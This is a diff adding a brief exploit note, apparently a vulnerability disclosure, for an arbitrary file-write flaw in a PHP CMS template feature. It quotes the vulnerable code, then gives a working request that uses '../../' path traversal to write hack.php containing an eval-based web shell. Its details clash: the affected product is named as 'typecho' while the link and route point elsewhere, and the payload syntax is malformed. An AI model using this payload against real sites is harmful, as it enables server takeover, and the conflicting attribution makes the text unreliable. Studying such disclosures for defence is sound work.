@@ -1,0 +1,23 @@
+# By 李在堂
+
+'''
+Filepath direct access to the file path here, although there is filtering, but it can not be affected	
+By adding a template, directly write any file
+Source:
+		write-post.php:91-96
+
+			$filepath = $dir . $file;
+            if (file_exists($filepath)) {
+                $this->error("该文件已经存在！");
+            }
+            $status = file_put_contents($filepath, htmlspecialchars_decode(stripslashes($content)));
+
+	Affected software:typecho <=3.1
+	Software Link: https://github.com/xueyuwan/www
+
+'''
+
+exploit:
+127.0.0.1/index.php?g=template&m=Style&a=add
+POST 
+dir=../../&file=hack.php&content=<?php @eval($_POST'hack'); ?>
